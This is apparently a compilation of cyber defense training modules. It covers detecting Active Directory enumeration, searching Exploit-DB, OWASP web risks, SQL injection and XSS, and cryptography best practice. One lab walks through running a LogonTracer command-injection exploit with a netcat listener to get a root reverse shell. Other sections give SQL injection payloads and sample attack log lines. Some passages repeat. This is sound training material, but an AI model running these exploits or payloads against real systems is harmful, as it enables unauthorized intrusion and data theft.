Another way to determine if NET.exe activity is suspicious is by examining its usage over time and creating a baseline. One red flag would be the observation that a certain user has not used the NET.exe command in the past 6 months but now they are enumerating Domain Admins and network shares. Time graphs can also be used to examine usage and determine if it is machine or human activity. Human activity is much more scattered than machine activity; machine activity usually has some semblance of structure to it. For example, if NET.exe is being run every hour, on the hour, automated machine activity — and perhaps an admin script — is likely occurring. This can be verified easily on a system by checking with the local admin or looking up the script or scheduled task that is triggering the activity.

﻿

The best tool is the analyst's mind. Get into the hacker's mindset, and filter everything analyzed through that lens.

﻿

In the labs that follow, this knowledge will be used to detect AD enumeration by running search queries in Security Onion.

﻿

PowerSploit/PowerView
﻿

PowerShell logs can be helpful when searching for PowerView activity. PowerShell Module logs (event ID 4103) and PowerShell Script Block logs (event ID 4104) can be used to gain valuable insights into an endpoint's PowerShell activity. PowerShell script block logging allows access to the full script being run, which can then be reverse engineered to understand what the adversary was doing. Such resources as Microsoft Ignite's articles on PowerShell provide more information on PowerShell logging, how to enable them, and how defenders can use them.

﻿

As discussed earlier, a baseline can be created to see what type of activity is normal. For example, most end users do not manually run PowerShell often. There may be cases where PowerShell is used as part of a login script, or used as part of expected normal activity — which can be excluded from analysis once identified as normal. Thus, searching for event codes 4103 and 4104 may return some spike in the timeline if a command like Find-DomainShare were run.

﻿

BloodHound/SharpHound
﻿

Multiple ways exist to detect SharpHound collection activity using client-side logs. SharpHound uses LDAP queries to perform the AD enumeration that collects the data to import into BloodHound for analysis. One way to detect SharpHound usage is to use Sysmon event ID 3 to look for several connections to TCP ports 389/636 (LDAP/LDAPS) and 445 (SMB). In addition, Sysmon event ID 18 can be used to look for several connections to named pipes srvsvc and lsass occurring at the same time as Sysmon event ID 3 events.

Detecting NET.exe Usage
This lab covers techniques to detect AD enumeration performed with NET.exe.

﻿

The CPT has been assigned to a mission to hunt for AD enumeration using normal system tools. The time range is Oct 26, 2021 @ 14:00:00.000 → Oct 26, 2021 @ 15:00:00.000.

5. Run an empty search across the time range Oct 26, 2021 @ 14:00:00.000 → Oct 26, 2021 @ 15:00:00.000.

﻿

The results (indicated in the green box shown below) show nearly 65,000 logs — far too many to manually sift through.

6. Narrow the results by searching for Sysmon Event Code 1, the event identification (ID) that shows a process being created.

event.code: 1
﻿

The results (shown below) have been reduced significantly, but more than 1,000 logs are still too many to manually sift through.

﻿

The time chart in Figure 6.5-14 clearly shows some machine activity every 30 minutes from about time 14:05 to time 14:35.

7. To make the data easier to analyze, search for the following fields in the Search field names box on the left. (In Figure 6.5-15, host.name is in the Search field names box.) Once the fields are listed under Available fields (see Figure 6.5-15), select the plus sign to the right of each field's name to add the field as a column.

host.name

user.name

process.command_line

Once all the fields have been added, the results appear, as Figure 6.5-16 shows:

This makes analyzing logs much easier because it allows for quick inspection of the fields that are known to provide the most value during an investigation.

﻿

8. Adversaries use NET.exe for AD enumeration, so add a condition to the search so that it returns logs only where process.name is net.exe.

event.code: 1 AND process.name: net.exe
﻿
Both CH-DEV-1.vcch.lan and ch-dc1.vcch.lan appear to have had net.exe activity in this time range. From the original search (see Figure 6.5-14), it was observed that there is some sort of machine activity running every 30 minutes, and the net.exe activity on ch-dc1.vcch.lan appears to fall into that machine activity. This machine activity should be reported to the IT team. However, an even more interesting activity is occurring on CH-DEV-1.vcch.lan. Trainee, a non-admin user, is running net commands to enumerate information about users, groups, and shares. It even appears that they attempted to gain access to a share called bkup on the DC. This needs to be reported right away.

There are 19 SharpHound logs, some with a destination port of 389 and some with a destination port of 445, as expected. Notice that process.executable provides the path where SharpHound was run on the system.

Add a condition to the search query so only event codes 4103 and 4104 are returned. Event code 4103 is PowerShell module logs, and 4104 is PowerShell script block logs.

Sources for Known Exploits
Searching for known exploits is a matter of conducting open-source research and consulting the appropriate resources. CDAs find the following resources helpful in searching for pre-existing exploits.

﻿

MITRE CVE
﻿

MITRE Common Vulnerabilities and Exposures (CVE) is not necessarily a repository of exploits, per se, but functions more like a catalog of known software vulnerabilities that establishes a standard on how they should be reported. Each vulnerability is assigned a CVE Identifier (CVE-ID); most exploits can be mapped back to a CVE-ID. MITRE's CVE database can be found at cve.mitre.org.

﻿

National Vulnerability Database
﻿

The National Vulnerability Database (NVD) is — as the name suggests — a database that stores information about vulnerabilities and is maintained by the National Institute of Standards and Technology (NIST). Unlike CVEs however, the NVD provides more comprehensive information on a vulnerability other than the fact that it exists. Some additional information that the NVD provides is the Common Vulnerability Scoring System (CVSS) score, as well as links to associated resources such as existing exploits. This allows for a more proactive approach, as a CVSS score provides a severity gauge that system owners can use to prioritize vulnerabilities that need to be addressed, rather than reacting due to being exploited. The NVD can be accessed by visiting nvd.nist.gov.

﻿

Exploit-DB
﻿

Exploit-DB is a database for publicly known exploits maintained by Offensive Security. Each entry maps back to a CVE-ID, which enables defenders to match exploits back to the corresponding vulnerability. The Exploit-DB is intended as a repository of exploits and PoCs rather than an advisory system. However, if there are exploits available for systems or software in the mission partner network on Exploit-DB, it would be advisable to expeditiously patch vulnerable systems or implement other mitigations.

﻿

Metasploit
﻿

The Metasploit Project is an open-source penetration testing platform maintained by Rapid7. The free version is known as the Metasploit Framework. While much less comprehensive than Exploit-DB, the Metasploit Framework contains hundreds of exploits that are very easy to use with plug-and-play functionality, which makes it popular for offensive and defensive cyber personnel alike. Exploit-DB often has exploits written to be easily integrated into the Metasploit Framework as well. If a mission partner is found to have internet-facing systems that are vulnerable to exploits found in the Metasploit Framework, Incident Response (IR) and forensics may be a more appropriate measure, as it is extremely likely that the network is already compromised.

﻿

In the following lab, use a terminal utility that queries a locally stored copy of Exploit-DB to search for publicly-available exploits.

Recall that to get a list of running services, a port scan is conducted, which usually includes service versioning.


3. Run the following command to conduct a port scan as well as gather more information about the service version and potential Operating System (OS) version against the first host while skipping host discovery. Using sudo prompts for a password, which is CyberTraining1!.
(trainee@dmss-kali)-[~] $ sudo nmap -sS -sV -Pn -O 200.200.200.10

Sometimes, Nmap prints more output from Transmission Control Protocol (TCP)/Internet Protocol (IP) stack fingerprinting from OS detection. The determination for the OS is still the same. 


Based on the scan results, a possible Ubuntu OS with Secure Shell (SSH) and Hypertext Transfer Protocol (HTTP) is open. The SSH version is OpenSSH 8.2p1 and the HTTP server is Werkzeug HTTP Daemon (HTTPD) with a version of 0.14.1. SSH is running on the standard port, and HTTP is running on alternate port 8080 versus port 80.


Note that while the results of the OS detection were inconclusive (only returning Linux rather than the specific distribution), the service versioning returned more specific information regarding the OS. This is because Nmap uses different probes while performing service versioning and OS detection.


If there are no operational security concerns related to security products in the network, then more information is better — which is why -sV (probe for service/version info) and -O (OS detection) were both used despite returning different data.


Exploits may or may not be OS — and service version — specific, so gathering as much information as possible is important.


Since there is a web server running on the 200.200.200.10 host, gather additional information about what may be hosted on the server by visiting the webpage. There is a variety of web applications that have further vulnerabilities on top of the underlying web server software. For example, website content managers such as WordPress and Drupal have introduced several vulnerabilities that enabled attackers to conduct arbitrary remote code execution.


4. Open Firefox and visit the following webpage:
http://200.200.200.10:8080



The web application that has been imported into the range relies on resources on the internet that are not accessible in the range. This is why the page does not render properly in the environment.

The application running on the webserver is something called LogonTracer. However, no software version is available.


At this point in time, the following leads for software to search for an exploit are available:
OpenSSH 8.2
Wekzeug HTTPD 0.14.1
LogonTracer unknown software version

This is enough information to begin searching Exploit-DB for exploits. Kali Linux has a CLI that allows users to search exploits in Exploit-DB. A local copy of Exploit-DB is maintained, so for the newest exploits, the database may require an update. This can be accomplished by running the following command:
searchsploit -u



NOTE: Internet connectivity is needed for this to work, so this is not performed in this lab.


5. View the help menu for SearchSploit to get a general usage idea of the utility by running the following command:
(trainee@dmss-kali)-[~] $ searchsploit -h

The syntax is simple and reasonably straightforward. For the searches in the following steps, do not use any switches.


6. Run the following command to search for exploits related to OpenSSH:
(trainee@dmss-kali)-[~] $ searchsploit openssh

There does not seem to be a viable OpenSSH exploit for the current software version — 8.2. For reference, knowing what to look for depends on what is being attempted. To gain access to the system, look for something that enables command execution, whereas to ensure that a host had a failover system in place, then look for a Denial of Service (DoS). To see if the systems can be remotely accessed and execute the desired commands, good exploit candidates would have the following attributes:
Matching software
Matching software version
Matching OS (if applicable)
If the exploit must be done over the network, then remote somewhere in the exploit title or path
May allude to Code Execution or Command Execution
May allude to being Unauthenticated, as there are no credentials to use.

7. Run the following command to search for exploits related to Wekzeug HTTPD:
(trainee@dmss-kali)-[~] $ searchsploit wekzeug

Once again, there are no viable results.


8. Run the following command to search for exploits related to LogonTracer:
(trainee@dmss-kali)-[~] $ searchsploit logontracer

There is an exploit present for the software, though unfortunately, the version is unknown. This is a good time to read the exploit to see if it can be used. Notice the partial path provided — multiple/webapps/49918.py. The filename — 49918.py — is also the exploit ID. Make note of the exploit ID for the next step. 

9. Run the following command to find the full path of the exploit. -p specifies the full path given an exploit ID and copies it to the clipboard, if possible.
(trainee@dmss-kali)-[~] $ searchsploit -p 49918

The full file path — as shown from the results of the command — is /usr/share/exploitdb/exploits/multiple/webapps/49918.py. CDAs should always look at the exploit before using it for a few reasons such as:
Finding usage instructions
Finding out more information about what the exploit is actually doing
Making modifications to the exploit script
Ensuring that there is no malicious code in the exploit

10. Run the following command to read the exploit script:
(trainee@dmss-kali)-[~] $ less -N /usr/share/exploitdb/exploits/multiple/webapps/49918.py

From lines 13–16, the user needs to provide the attacker's IP address, attacker's port, and the Uniform Resource Locator (URL) to the victim.

From lines 22–29, it is evident that it is a command injection vulnerability that is being exploited, which sends back a shell to an attacker's listener.

Keep in mind, it is not necessary to understand everything that is happening in the script, just a general idea of what it is doing. There is no need for an in-depth code review.


11. Run the following command to print the exploit script's help menu:
(trainee@dmss-kali)-[~] $ python3 /usr/share/exploitdb/exploits/multiple/webapps/49918.py -h

Now the syntax of the command is known.

12.  Start a listener before running the exploit, as the exploited host needs something to call back to. The port is somewhat arbitrary. In this case, 4444 is used.
(trainee@dmss-kali)-[~] $ nc -nlvp 4444

13. Open a new tab or window, and run the following command to run the exploit:
(trainee@dmss-kali)-[~] $ python3 /usr/share/exploitdb/exploits/multiple/webapps/49918.py 199.63.64.51 4444 http://200.200.200.10:8080

The output states If the terminal hangs, you might have a shell. Since the terminal hangs immediately after sending the exploit, this is a good sign.

14. Switch back to the other terminal where Netcat was running.

A shell was received from the exploited host. Notice that a few seemingly random characters are returned in the prompt as well. These are escape codes, which are responsible for formatting text that is typically seen when entering text into a terminal and do not affect running commands.

15. Run a command to check the functionality of the shell.
(trainee@dmss-kali)-[~] $ /usr/local/src/LogonTracer # whoami

The shell appears to be in working order, and notice you are the root user on the victim host.

Mitigating Known Exploits
Mitigating known exploits is usually a matter of removing the underlying vulnerability; if the vulnerability does not exist, then the exploit does not work. However, network defenders need to be aware of the vulnerabilities and remain updated on the latest ones to be able to effectively mitigate them. Mitigating vulnerabilities may be composed of a few elements.

﻿

﻿

﻿

Asset Management
﻿

To know which devices are vulnerable, it is necessary to know what devices actually exist within the network. While this sounds like a simple matter, asset management can quickly get out of hand, especially in larger organizations. Vulnerable devices do not just apply to workstations and servers; it applies to any computing device running some kind of OS. This includes Internet of Things (IoT) devices, multi-function devices, printers, video teleconferencing equipment, etc., which many network defenders overlook. 

﻿

Updates and Patching Policy
﻿

Updates and patches are among the most effective measures of mitigating known exploits. Once a vulnerability is made public, vendors typically issue a patch that can be applied to the vulnerable system. Patches are often referred to as hotfixes or security updates. While applying the necessary patches seems like a common-sense measure, organizations may not have an effective patching policy in place, which leaves them vulnerable to the whims of attackers. For example, in the Equifax Breach that occurred in 2017, attackers exploited a vulnerability in Apache Struts when the patch was released two months prior.

﻿

Once an idea of what type of systems exist in the network is determined, the next piece of the puzzle is to examine the update and patching policy. Are updates done monthly or weekly or even at all? Are they rolled out automatically? Which systems receive patches? These are some of the questions asked when investigating the updates and patching policy. A good patching policy typically includes the following steps:

Evaluating patches
Testing patches
Approving patches
Deploying patches
Verifying patch deployment
Some companies publish updates on a specific day of the month. Adobe, Microsoft, and Oracle release updates every second Tuesday of the month. This makes it easy for system administrators to plan around them and gives them time to schedule testing and deployment. Patch Tuesday — as it was coined, unfortunately — is followed by Exploit Wednesday. Since attackers also know the update schedule, they often attempt to reverse engineer the patches released on Tuesday, and then exploit devices on Wednesday since it is common for system administrators to not issue updates immediately.

﻿

Periodic Vulnerability Scans/Assessments
﻿

Vulnerability scanning and assessments were covered in a previous module. Some of the tools covered included Assured Compliance Assessment Solution (ACAS), OpenVAS, and Nmap. Conducting periodic vulnerability scans reveals vulnerabilities not addressed by updates and patching. They may also catch configuration-related vulnerabilities, weak passwords, etc. Vulnerability scans allow system administrators to proactively identify existing vulnerabilities and defend their systems before attackers exploit them. One important note to keep in mind is that a vulnerability scanner is only as good as its signatures. To get the best use out of a vulnerability scanner, conduct regular updates on the software to have the most up-to-date vulnerability database.

sqli

Web Attacks Overview 
Adversaries may look to exploit the Application layer of the Open Systems Interconnection (OSI) model — Layer 7. Layer 7 is the top layer of the model. It is at the Application layer where users interact with software (applications) that can be connected to the internet. The servers and databases are responsible for hosting the web applications, which may be vulnerable to attacks. The servers and databases connected to the internet are designed to be running and reachable by users at all times, meaning they are constantly susceptible to an attack. The servers and databases also often contain sensitive data regarding Personal Identifiable Information (PII) and information regarding the systems and services to which they are connected, making them an attractive target for the adversary. Another obstacle for defense teams to consider is the location of the servers and databases on the network. 

OWASP Top 10 Web Application Security Risks
﻿

(Image from OWASP)

﻿

The leading organization in defining risks, vulnerabilities, and providing defensive strategies for web applications and attacks is Open Web Application Security Project® (OWASP). OWASP is a nonprofit foundation whose primary goal is to improve the security of software. The OWASP Top 10 Web Application Security Risks — simply referred to as the OWASP Top 10 — is a standard awareness document for developers and web application security. The OSWAP Top 10 represents a broad consensus about the most critical security risks to web applications. Below is the 2024 OWASP Top 10:

﻿

1. Broken Access Control
﻿

User access restrictions are often not properly enforced or enforced insecurely, which can allow attackers to gain unauthorized functionality (e.g., administrator portal) or access to other user accounts, data, etc.

﻿

2. Cryptographic Failures 
﻿

A broad symptom rather than a root cause, the focus is on failures related to cryptography — or lack thereof. This often leads to exposure of sensitive data. An organization must determine the protection needs of data in transit and at rest. For example, passwords, credit card numbers, health records, PII, and business secrets require extra protection, mainly if that data falls under privacy laws (e.g., European Union's General Data Protection Regulation [GDPR]) or regulations (e.g., financial data protection such as Payment Card Industry Data Security Standard [PCI DSS]).

﻿

3. Injection
﻿

Injection flaws occur when untrusted data is passed to an interpreter as part of a command or query within a web application. The untrusted data can allow the attacker to execute code on the underlying web server. These flaws can be associated with, but are not limited to, SQL, NoSQL, Operating System (OS), and Lightweight Directory Access Protocol (LDAP), and can provide access to the underlying web server in many cases. Exploitation leads to server access.

﻿

4. Insecure Design 
﻿

Insecure design is a broad category representing different weaknesses, expressed as missing or ineffective control design. Insecure design is not the source for all other Top 10 risk categories. There is a difference between insecure design and insecure implementation. The differentiation between design flaws and implementation defects is necessary as they have different root causes and remediation. A secure design can still have implementation defects leading to vulnerabilities that may be exploited. An insecure design cannot be fixed by a perfect implementation as, by definition, they need security controls that were never created to defend against specific attacks. One factor that contributes to insecure design is the lack of business risk profiling inherent in the software or system being developed, and thus the failure to determine what level of security design is required.

﻿

5. Security Misconfiguration
﻿

Security misconfiguration is the most commonly seen issue. These misconfigurations cover all aspects of security from insecure default configurations, unfinished installations, unpatched services, verbose logging, and many more. 

﻿

6. Using Components with Known Vulnerabilities
﻿

Web applications are often a melting pot of code from many other sources. Using modules and libraries that run with the same privileges as the rest of the web applications can increase the speed of development, but can also enable unknown vulnerabilities on a web application. If external code is not reviewed for patches and vulnerabilities, even the securest of coding practices can be left vulnerable. 

﻿

7. Identification and Authentication Failures
﻿

Confirmation of the user's identity, authentication, and session management is critical to protect against authentication-related attacks. There may be authentication weaknesses if the application:

Permits automated attacks such as credential stuffing, where the attacker has a list of valid usernames and passwords.
Permits brute force or other automated attacks.
Permits default, weak, or well-known passwords, such as Password1 or admin/admin.
Uses weak or ineffective credential recovery and forgot-password processes, such as knowledge-based answers, which cannot be made safe.
8. Software and Data Integrity Failures 
﻿

Software and data integrity failures relate to code and infrastructure that do not protect against integrity violations. An example of this is where an application relies upon plugins, libraries, or modules from untrusted sources, repositories, and Content Delivery Networks (CDN). An insecure Continuous Integration/Continuous Delivery (CI/CD) pipeline can introduce the potential for unauthorized access, malicious code, or system compromise. Lastly, many applications now include auto-update functionality, where updates are downloaded without sufficient integrity verification and applied to the previously trusted application. Attackers could potentially upload their own updates to be distributed and run on all installations. Examples that are vulnerable to insecure deserialization include objects or data encoded or serialized into a structure that an attacker can see and modify.

﻿

9. Insufficient Logging and Monitoring
﻿

Logging and monitoring are paramount for externally-facing services. Logging and monitoring of those logs are required in any Incident Response (IR) to draw the full picture of an incident. Without logging and monitoring, it is very difficult to review what happened during the incident or to even realize that an event occurred. Exploitation is not really a factor, but insufficient logging and monitoring affect all other compromise remediation.

10. Server-Side Request Forgery﻿

Server-Side Request Forgery (SSRF) flaws occur when a web application is fetching a remote resource without validating the user-supplied Uniform Resource Locator (URL). It allows an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall, Virtual Private Network (VPN), or another type of network Access Control List (ACL).﻿

As modern web applications provide end-users with convenient features, fetching a URL becomes a common scenario. As a result, the incidence of SSRF is increasing. Also, the severity of SSRF is becoming higher due to cloud services and the complexity of architectures.

﻿
In many cases, the OWASP Top 10 can be mitigated by filtering the user input prior to passing the data to the underlying services. Vigilance in patching and proper code review of any externally-sourced code helps decrease exploit vectors. If the web application is hosted on a web server, it is important to securely configure that underlying web server service as well as the other services on the host, and remove any unneeded services. For example, Common UNIX Printing System (CUPS) is a print server that is installed and enabled on many Linux distributions by default. CUPS has had nine documented Common Vulnerabilities and Exposures (CVE) since 2017, which include Remote Code Execution (RCE) that could lead to the compromise of a web server without any interaction with the web application itself.

Which of the OWASP Top 10 occurs when user access restrictions are often not properly enforced or enforced insecurely?

SQLI Overview
SQLI is an attack exploiting the injection of SQL commands into the SQL queries of a web application. A successful SQLI attack gains the adversary access to a database that operates as the backend to a web application. Web applications commonly use a database for storing and managing data such as user credentials. To interact with databases, entities such as systems operators, programmers, and web applications use the Structured Query Language (SQL). The code takes care of establishing and keeping the connection to the database by using connectors. The fundamental principle of an injection attack is identifying a vulnerability that enables an escape from the intended code or query, allowing the attacker to inject arbitrary code of their own, which is executed by the victim server under the guise of whichever process presents the web interface or backend database externally. In a SQLI attack, which targets poorly-coded requests for input that is inserted into a query to the backend database, the attacker principally seeks to achieve an escape through the use of characters that a web engineer failed to sanitize.

Most modern web applications need to keep some permanent storage. Storage is typically accomplished with a database. Web applications commonly communicate with their database backend using SQL. With SQL, the applications create queries to read and write information in the database.

In addition, web applications frequently exploit user input as part of their SQL queries. However, SQL is often constructed as a string in the underlying programming language and passed to the database. If the programmer is not careful, there is a blurred line between user input and SQL query structure, allowing users to modify the query structure and change the query's intended behavior. This is done by using input that makes use of the SQL query syntax. Since the user input is concatenated to the rest of the query, the database interprets the SQL syntax in the user input as part of the query, causing the query to change into something potentially harmful.

SQLI Fundamentals
To understand how SQLIs happen, consider the following SQL query:

Figure 7.3-2 displays a basic query used to authenticate a user on a web application. In this scenario, the username input gets placed between the quotes after username and the password input between the quotes after password. If the user entered a username of 'admin' and a password of 'test123,' the query that gets passed to the database is the following:

If the underlying programming language concatenates the user input, the SQL query interpreter converts any special characters in the username or password. This allows the query syntax to be changed. For example, consider what happens if the username is set to a single quote, but the password remained test123. The resulting SQL query is the following:

The query example above contains three single quotes in a row to the database server. These quotes are interpreted as two strings side by side. The first string, delimited by the first two single quotes, is interpreted as an empty string. The third quote starts another adjacent string that ends with the equal sign after the word password. Adjacent strings are typically valid syntax in SQL queries. However, the second string is immediately followed by the word test123'. The database interprets the string as a keyword. But test123' is not a valid keyword in SQL, so the database throws an error for an ill-formed SQL query.

﻿
The main point from the example above is that by including certain special characters, the attacker causes the database to misinterpret the SQL query and even inject SQL keywords that were not originally there. This can allow an attacker to inject functionality into the SQL query.

Now, consider a common proof of concept attack for this vulnerability type, in which the username is set to admin and the password to the following:

password' or 1='1
﻿

This results in the following query:

The first quote in the password field is interpreted as the end of the password value.

The or is interpreted as a logical OR operator.

The 1='1' is interpreted as an added condition.

In other words, find all users with the username admin and either the password equal to password or where the condition 1=1 is true. The final condition is always true, and so the check passes regardless of whether the password is actually password.

Common Characters and Syntax
﻿
SQLI attacks use common syntax and characters to leverage vulnerabilities in database design. Table 7.3-1 includes characters — as defined by Microsoft — that are frequently seen in SQLI attacks:

Characters that perform delimiter functions determine the limits or boundaries of the areas they are querying. 

Operators in SQL use characters to manipulate and find data within the database. A common operator that is utilized in an SQLI attack is UNION. The UNION operator is used in SQL to combine two or more SELECT statements. Additionally, the UNION operator can be used to retrieve data from multiple tables within a database. The UNION operator can help the adversary discover table s, columns,  users, and file paths. 

Common Characters and Syntax


SQLI attacks use common syntax and characters to leverage vulnerabilities in database design. Table 7.3-1 includes characters — as defined by Microsoft — that are frequently seen in SQLI attacks:

Characters that perform delimiter functions determine the limits or boundaries of the areas they are querying. 


Operators in SQL use characters to manipulate and find data within the database. A common operator that is utilized in an SQLI attack is UNION. The UNION operator is used in SQL to combine two or more SELECT statements. Additionally, the UNION operator can be used to retrieve data from multiple tables within a database. The UNION operator can help the adversary discover table s, columns,  users, and file paths. 

Cross-Site Scripting Overview
XSS is an attack in which its ultimate purpose is to inject HTML — known as an HTML injection — into a user’s web browser. XSS is one of the oldest web application attacks known and is dated to around 1996–1998, when it was possible to control frames within a webpage through injected code, providing the crossing of website boundaries. Currently, XSS is still on top of the OWASP Top 10 Web Application Security Risks. XSS is considered an attack against the user of a vulnerable website; it is difficult to anticipate and prevent. Knowledgeable developers actively trying to prevent attacks may be vulnerable to other possible forms of attack that they are not aware of.

﻿

HTML and CSS Markup Attacks
﻿

The most basic of XSS attacks is the insertion of HTML and Cascading Style Sheets (CSS) content into the HTML of a website. This simple attack is executed by injecting a comment or annotation that is then displayed on the website. Website users do not have any power to stop this attack as they are not able to turn off HTML rendering in the browser (in the same way that they can turn off JavaScript or images). The adversary who accomplishes an exploit like this can obscure part or all of the page, and render official-looking forms and links for users to interact with.

﻿

Stored XSS
﻿

Stored XSS is a version of the attack where input is stored on the target server. Typically the input is stored in a database, message forum, log, or comment field. The user then interacts with the website, which retrieves the stored data from the website and sends it to the user. 

﻿

Reflected XSS
﻿

As defined by OWASP, reflected XSS occurs when user input is immediately returned by a web application in an error message, search result, or any other response that includes some or all of the input provided by the user as part of the request, without that data being made safe to render in the browser, and without permanently storing the user-provided data. To execute the reflected version of the XSS attack, an injected script reflects off the target server. The reflection is done by a page search result, an error message, or another created message by the user. Reflect XSS is a very damaging style of attack because it weaponizes the trust of the server from which the code is reflecting. 

﻿

Document Object Model-Based XSS
﻿

Document Object Model (DOM)-Based XSS, also referred to as Type-0 XSS, is a version of the attack where the execution of the attack occurs as a result of modifying the DOM environment in the target's browser. The modification occurs within the client-side script, as a result, the script does not perform as expected. When executed properly, the page itself — the HTTP response — does not change, but the client-side code contained in the page executes differently due to the malicious modifications that have occurred in the DOM environment.

Identifying SQLI in Logs
Log files provide a valuable piece of evidence in helping identify a web application attack. The logs collected on servers and applications record all actions and requests made to the device. Hidden within the logs are pieces of information that identify the type of attack, when the attack occurred, and what IP address was responsible.

﻿

Web logs are log files that are created and maintained by web servers on a network. Web logs contain information about the connections and requests made to the website or application — information that is critical in an investigation. On a typical web server, there are two types of log files: access.log and error.log. The access.log file contains all requests made by users interacting with the application. Information in the access.log file includes what pages the users are viewing, the status of requests, and the speed requests were served. The error.log contains all errors the server encountered. For the purposes of defense, security, and investigation, the access.log is the primary focus.

﻿

Expected Web Log Entry
﻿

Below is a sample entry in the access.log. The entry typically — and expectedly — contains the successful login of the DVWA:

127.0.0.1 - - [20/Oct/2021:15:01:12 -0400] "GET /dvwa/login.php HTTP/1.1" 200 1415 "http://localhost/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
﻿

Starting from the left, the logs provide the following information:

IP address: 127.0.0.1 
Date and time of request: October 20, 2021 @ 15:01:12 
Time on the server (relative to UTC): -0400
Request made: GET /dvwa/login.php HTTP/1.1" 200
The request here is the user logging into the DVWA via the use of HTTP. The number 200 is a Hypertext Transfer Protocol (HTTP) status code — 200 indicates the request succeeded. In this case, the user was able to log in.
URL: http://localhost/ 
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (Konqueror Hyper Text Markup Language [KHTML], like Gecko) Chrome/44.0.2403.155 Safari/537.36
Web Log Entry with SQLI Attack
﻿

Below is a sample entry in the access.log including a successful SQLI attack:

127.0.0.1 - - [21/Oct/2021:09:30:02 -0400] "GET /dvwa/vulnerabilities/sqli/?id=%27+UNION+SELECT+null%2C+%40%40datadir+%23&Submit=Submit HTTP/1.1" 200 4342 "http://localhost/dvwa/vulnerabilities/sqli/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
﻿

Starting from the left, the logs provide the following information:

IP address: 127.0.0.1 
Date and time of request: October 21, 2021 @ 09:30:02 
Time on the server (relative to Greenwich Mean Time): -0400
Request made: GET /dvwa/vulnerabilities/sqli/?id=%27+UNION+SELECT+null%2C+%40%40datadir+%23&Submit=Submit HTTP/1.1" 200
The request here is the user making a request within the DWVA SQLI page. The user requested ?id=%27+UNION+SELECT+null%2C+%40%40datadir+%23&Submit=Submit. The HTTP status code 200 indicates the request succeeded. 
URL: http://localhost/dvwa/vulnerabilities/sqli
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
The use of the UNION operator, as well as the URL encoded @ symbol (hex %40) for the global variable, is an immediate red flag and indicative of a potential attempt to leverage the SQL database. The log entry above was taken from the SQLI lab earlier in this lesson where SQLI was used to derive the database's location. The query is provided below:

'UNION SELECT null, @@datadir#

'UNION ALL SELECT current_user(),user() #             =============       The database's current user

Cryptography Overview
Trainees may have encountered the Confidentiality, Integrity, and Availability (CIA) triad. The CIA triad is a model used to govern and guide policies related to information security within an organization.

Confidentiality: Ensures unauthorized individuals cannot access sensitive and private information. 

Integrity: Prevents unauthorized individuals from modifying or deleting data.

Availability: Addresses the access component and states that data should be accessible when needed.

Cryptography addresses the confidentiality and integrity aspects of the CIA triad with encryption and hashing.

Cryptographic algorithms should adhere to Kerchoff's principle to be effective. Kerchoff's principle states that a cryptographic system should remain secure even if everything is known about that system, except for the key. In other words, security should not be achieved through obscurity.

﻿
Hashing

Hashing is one of the cornerstones of cryptography and involves the usage of a one-way function on arbitrary input data to always produce the same output. It is a powerful tool to use to verify data integrity and is often used with many authentication mechanisms.

Encryption
﻿
Encryption scrambles data so that unauthorized individuals cannot decipher the original meaning of a message. Encryption primarily covers the confidentiality aspect of the CIA triad. However, it does not prevent unauthorized individuals from modifying the data.

Hashing and encryption work in tandem to provide confidentiality and integrity. The following sections delve into these two cryptographic tools.

Hashing Scenario Recap
In this scenario, a mission partner's custom implementation of a password storage solution was examined. A cryptographically insecure algorithm was used and the hashes were stored unsalted, which enabled a rainbow table attack. It is recommended to use a more secure algorithm and salt the hashes.

﻿

Hashing Best Practices
﻿

The National Institute of Standards and Technology (NIST) recommends usage of the following algorithms:

SHA2
SHA3
SHAKE128
SHAKE256
While formally deprecated in 2011, SHA0 or SHA1 may still appear in some publications, despite being deemed cryptographically insecure with a few publicly known attacks. SHA0 or SHA1 may both be referred to as SHA in different contexts. SHA0 and SHA1 both only produce hashes of 160 bits.

﻿

SHA2 and SHA3 can produce hashes of set sizes between 224 and 512 bits. References to SHA*, (i.e., SHA256), typically mean the algorithm used is SHA2 while SHA3 is SHA3*.

﻿

If seen in mission partner networks, make a recommendation to switch to more secure algorithms. If a custom hashing algorithm is seen, urge the mission partner to change to an algorithm approved for Federal systems, as custom algorithms are not evaluated or tested by expert committees.

﻿

In addition to salting, another practice that can further secure password storage is peppering. Peppering is the practice of encrypting the password database or the individual hashes with an encryption key so that attackers need to decrypt the data to access the hashes. Unlike a salt, a pepper is the same for the entire database and is not stored in the database.

Encryption Scenario Recap
In this lab, a mission partner's encryption script was examined, which used a weak algorithm for encryption and utilized a weak encryption mode that enabled attackers to eventually see patterns in the encryption and deduce the plaintext. Recommendations made to the mission partner include using a stronger encryption algorithm such as AES and using an encryption mode that is not ECB.

﻿

Encryption Best Practices
﻿

NIST recommends AES or 3DES for block cipher usage. Previously, Skipjack and DES were approved algorithms, but NIST rescinded support for these as they were deemed to be insecure. The minimum key length for block ciphers should be 112 bits (DES effectively only had a key length of 56).

﻿

NIST also has 14 approved encryption modes. Encryption confidentiality modes, while providing for confidentiality, may not prevent attackers from modifying encrypted data in transit. Confidentiality modes include:

ECB mode – Do not use this mode
CBC mode
Counter mode (CTR)
Cipher Feedback mode (CFB)
Output Feedback mode (OFB)
These five modes are defined in NIST's Special Publication (SP) 800-38A. Other modes that also provide for authentication are known as Authenticated Encryption with Additional Data (AEAD) modes and include:

Galois Counter Mode (GCM) 
Cipher block Chaining-Message authentication code (CCM)
For asymmetric encryption, NIST recommends using:

Digital Signature Algorithm (DSA)
Rivest Shamir Adelman (RSA) algorithm
Elliptic Curve Digital Signature Algorithm (ECDSA)
NIST recommends a minimum key length of 2048 for RSA keys and 256 bits for ECC keys.

Detecting Insecure Cryptography over the Network
To establish a secure channel over the internet with no prior knowledge of who the person is, three things are needed:

Key exchange: A method to secure exchange keys.

Bulk encryption algorithm: Encrypts most of the communications.

Message Authentication Code (MAC): A method to verify integrity of the message that is transmitted with the message.

